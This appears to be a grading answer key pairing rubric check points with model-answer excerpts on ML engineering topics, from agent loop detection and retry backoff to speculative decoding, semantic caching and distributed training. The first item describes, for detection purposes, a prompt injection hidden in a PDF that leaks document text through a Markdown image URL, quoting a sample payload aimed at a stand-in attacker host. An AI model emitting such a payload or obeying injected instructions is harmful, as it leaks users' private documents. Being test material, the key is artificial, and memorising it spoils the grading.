checks.point: Prompt injection encodes document text in external Markdown image URLs.
answerExcerpts: Unauthorized outbound HTTP requests containing document text reveal a markdown image exfiltration attack via prompt injection. We isolate this by searching the PDF's text layer for hidden instructions like ![exfil](https://attacker.com/?data=...) and testing client-side HTML output rendering. checks.point: Use embedding similarity to detect rephrased queries without new information.

checks.point: Intervene with an alternate-strategy instruction and terminate persistent loops.
answerExcerpts: An agent can get stuck repeating the same failed action with minor phrasing variations, such as slightly tweaking a search query without learning from previous misses. We detect and break these loops using state hashing and semantic distance tracking. For exact loops, we maintain a rolling history of tool calls and hash the tool name alongside its arguments. If the identical hash appears more than twice in recent history, an exact loop is detected. For semantic loops where the agent rephrases arguments, we embed recent inputs and measure cosine similarity; if consecutive queries have near-identical semantic embeddings without new information, we flag a semantic cycle. When a loop is detected, we intercept execution and inject a system intervention message prompting the agent to reflect on its failure or try an alternate strategy. If the loop persists, the runtime terminates the task. The trade-off is exploratory flexibility versus loop prevention: aggressive cycle detection can interrupt legitimate iterative refinement, so detection thresholds must require multiple consecutive repetitions.

checks.point: Decrement hop counts and block delegation at zero.

checks.point: Retry transient failures with exponential backoff and full jitter.
answerExcerpts: In multi-agent systems where supervisor agents delegate sub-tasks to specialized subagents, a failure in a leaf agent can trigger rapid retries that cascade upstream, causing a thundering herd that saturates downstream services. We prevent cascading failures using two mechanisms: distributed hop limits and exponential backoff with full jitter. First, we attach a global time-to-live and hop budget header to every inter-agent task message. When Agent A delegates to Agent B, the hop counter decrements; if the counter reaches zero, further delegation is blocked, preventing unbounded recursive subagent spawning. Second, when a subagent tool fails due to rate limits or transient errors, we do not retry immediately. We apply exponential backoff with full jitter, calculating sleep time as a random value between zero and the exponentially backed-off interval. The trade-off is task completion latency versus system stability: backoff delays overall task execution, but it prevents multi-agent trees from synchronizing their retries and overwhelming backend infrastructure.

checks.point: A draft model proposes K tokens for parallel target verification.
answerExcerpts: Speculative decoding accelerates inference by pairing a small, fast draft model with a large target model. The draft model autoregressively generates K candidate tokens cheaply. The target model then verifies all K tokens in a single forward pass, evaluating their conditional probabilities in parallel using modified causal attention masks. If the target model agrees with the draft token, the token is accepted; at the first mismatch, the target model samples a replacement token from a modified residual distribution and discards subsequent draft tokens. If the acceptance rate is high, the system generates multiple tokens per target forward pass. However, if the acceptance rate drops below approximately fifty percent, the target model rejects most draft tokens. The system still pays the latency of running the draft model and setting up verification tensors, but gains only one or two tokens per step. The trade-off is inference speedup versus draft compute overhead: speculative decoding achieves two times speedups when the draft aligns with target distributions, but degrades latency when drafting low-entropy code or math where draft models diverge frequently.

checks.point: Top softmax confidence alone can be misleading on out-of-distribution inputs.
answerExcerpts: For classification models, examining the top softmax probability alone is misleading because neural networks are notoriously overconfident on out-of-distribution data.

checks.point: Use top-two probability margins and entropy for classification uncertainty.
answerExcerpts: Instead, we compute the margin between the top two probabilities, and calculate Shannon entropy across the probability distribution: high entropy indicates that probability mass is spread across multiple conflicting classes.

checks.point: Measure semantic consistency across sampled generative outputs.

checks.point: Escalate high uncertainty to humans with a review-volume trade-off.
answerExcerpts: In high-stakes applications like content moderation, medical document triage, or loan classification, models must recognize when they do not know the answer. We quantify uncertainty using both prediction probabilities and output entropy. For classification models, examining the top softmax probability alone is misleading because neural networks are notoriously overconfident on out-of-distribution data. Instead, we compute the margin between the top two probabilities, and calculate Shannon entropy across the probability distribution: high entropy indicates that probability mass is spread across multiple conflicting classes. For generative models, we sample multiple completions at a low temperature and measure semantic consistency across outputs. When entropy exceeds a calibrated threshold or semantic agreement is low, the pipeline flags the item as high-uncertainty, halts automated processing, and routes the ticket to a human review queue. The trade-off is automated throughput versus decision risk: conservative uncertainty thresholds ensure safety but increase human review volume, while loose thresholds risk silent model errors.

checks.point: Low thresholds admit incorrect matches while high thresholds lose paraphrase hits.
answerExcerpts: A semantic vector cache intercepts repeated LLM queries by comparing incoming query embeddings against cached query vectors. Because users rarely type identical queries character-for-character, exact string caches achieve low hit rates. Semantic caches use vector similarity to match paraphrases. Tuning the cosine similarity threshold is the critical trade-off. If the threshold is set too low (such as 0.85), queries with contrasting meanings or subtle domain differences match incorrect cached answers—such as returning an explanation of 'DDP' for a query asking about 'FSDP'. If the threshold is set too high (such as 0.99), even minor wording changes miss the cache, dropping hit rates down to exact-match levels. We evaluate thresholds empirically on historical query pairs using ROC curves, plotting false semantic match rates against cache hit rates. In production, thresholds are typically calibrated tightly between 0.94 and 0.97 using domain-tuned embedding models. The trade-off is cost savings versus answer correctness: semantic caching cuts 30% to 50% of LLM compute, but requires strict threshold validation to avoid returning false answers to subtly different questions.

checks.point: User-level randomization fails when treatment consumes shared marketplace supply.
answerExcerpts: Standard user-level A/B testing assumes the Stable Unit Treatment Value Assumption (SUTVA): the treatment assigned to one user must not affect the outcomes of other users. In two-sided marketplaces like ride-sharing, food delivery, or shared compute clusters, this assumption fails completely due to shared supply pools. For example, if treatment users receive an aggressive algorithm that dispatches couriers faster, they consume available drivers, leaving fewer drivers for control users. Control users experience higher wait times not because their algorithm is worse, but because treatment cannibalized shared supply, leading to false positive experiment results. We solve this using switchback experimentation. Instead of randomizing by user, we randomize by geographical clusters and discrete time windows, such as alternating treatment and control every 30 minutes in a specific city zone. All users and drivers in that zone experience the identical policy during that window, eliminating direct interference. The trade-off is sample size and carryover effects versus causal validity: switchbacks produce unbiased causal estimates, but require longer runtimes and order-of-magnitude larger sample sizes to overcome temporal autocorrelation.

checks.point: In-batch positives serve as negatives for other users via B-by-B dot products.
answerExcerpts: Two-tower models perform large-scale candidate retrieval by mapping user context and candidate items into a shared embedding space using separate user and item neural networks. In a production catalog of 100 million items, computing full softmax over all items is computationally impossible. In-batch negative sampling solves this: within a training mini-batch of B user-item interaction pairs, the positive item for User i serves as a negative item for all other B minus one users in that same batch. This allows computing B-by-B dot products efficiently using a single matrix multiplication without sampling explicit negatives from disk. However, in-batch negative sampling introduces popularity bias: popular items appear more frequently in user interactions, meaning they are sampled as negatives far more often than rare items, causing the model to penalize popular items unfairly. We correct this using logQ correction: we compute each item's marginal sampling probability Q and subtract the log of Q from the raw dot product logit before applying cross-entropy loss. The trade-off is computational efficiency versus negative hardness: in-batch negatives provide fast O(B^2) training samples, but lack challenging hard negatives unless paired with dedicated hard negative mining.

checks.point: Future feature values leak labels and inflate offline scores.
answerExcerpts: Point-in-time correctness ensures that when generating training data for past events, the feature values matched to each label reflect exactly what was known at the historical moment the event occurred. Without this, offline models suffer from temporal data leakage. For example, if predicting loan default at the application timestamp of June 1st, using a feature computed on July 1st that reflects subsequent missed payments leaks the future label into training, producing an artificially high validation score that collapses in production. Feature stores solve this using AS OF time-travel joins. Each feature update in the offline store is recorded with an observation timestamp. When generating training sets from an observation table containing entity IDs and event timestamps, the feature store joins the latest feature value whose timestamp is strictly less than or equal to the event timestamp. The trade-off is query complexity and storage volume versus model reliability: maintaining immutable temporal feature logs requires partitioned time-series storage, but it guarantees zero future leakage in training.

answerExcerpts: In large language models starting around 6 billion parameters, certain hidden state dimensions exhibit extreme activation values—often 20 to 100 times larger than normal activations. In Post-Training Quantization (PTQ), we quantize weights and activations on calibration data without full retraining. Because uniform quantization maps the entire dynamic range into a small integer grid (like INT8 with 256 levels), scaling down to accommodate these massive outliers crushes the precision of normal values, causing severe degradation and perplexity explosions. Quantization-Aware Training (QAT) models quantization noise directly during fine-tuning. In the forward pass, weights and activations are quantized to low precision to simulate quantization error, but gradients in the backward pass are computed using the Straight-Through Estimator in FP32. The model weights learn to suppress activation spikes and distribute information across channels that tolerate low precision. The trade-off is compute cost versus precision: PTQ runs in minutes with zero labeled data, while QAT requires retraining cycles and labeled training sets.

answerExcerpts: In multi-agent systems, agents must coordinate to complete complex workflows. In a hierarchical supervisor architecture, a central coordinator agent receives the primary user request, decomposes it into sub-tasks, assigns work to specialized worker agents, synthesizes their results, and maintains global state. Communication is strictly vertical: workers report only to the supervisor. In peer-to-peer agent choreography, agents communicate directly with each other via message buses or direct calls without a central controller, negotiating responsibilities dynamically. Supervisor patterns provide predictable execution, centralized budget tracking, and deterministic debugging, but the supervisor can become a reasoning and token bottleneck. Peer-to-peer patterns allow organic problem solving, but risk circular message storms and deadlocks where Agent A waits for Agent B while Agent B waits for Agent A. To prevent deadlocks, we enforce strict acyclic message graphs using hop counters and timeout deadlines. The trade-off is coordination predictability versus emergent autonomy: supervisors guarantee deterministic completion, while peer choreography offers flexibility for collaborative research tasks.

checks.point: Overlap communication with remaining backward computation.
answerExcerpts: In Distributed Data Parallel, each GPU holds a full model replica and computes backward gradients on its own data shard. Gradient synchronization is strictly synchronous because all replicas must apply identical parameter updates at every step to keep weights mathematically identical without diverging. To hide communication latency, PyTorch does not wait until the entire backward pass finishes. It organizes parameters into buckets in reverse layer order. As soon as backward autograd completes the gradients for a bucket, DDP initiates an asynchronous Ring-AllReduce across all GPUs while earlier layers are still computing gradients. Ring-AllReduce shares gradients in logical rings of chunks: each GPU sends and receives simultaneously, transferring two times the gradient size divided by the number of ranks. The trade-off is bucket size tuning: large buckets achieve high network bandwidth utilization on InfiniBand, but small buckets start communication earlier to overlap with backward computation.

answerExcerpts: We build an autonomous agent runner with deterministic execution guardrails to prevent infinite recursion, runaway token expenditure, and repeated identical tool calls. The runner receives a task and an environment interface. At each iteration, we check whether our step budget has expired. We maintain an in-memory history of tool call signatures composed of the tool name and sorted JSON arguments. If a tool call repeats an identical signature and fails consecutively, we flag an active loop and abort. We track total token consumption across prompt and completion turns, breaking if the budget is breached. Testing covers normal single-step answers, multi-turn tool loops terminating within limits, repeated tool invocation detection, and graceful budget exhaustion returns.
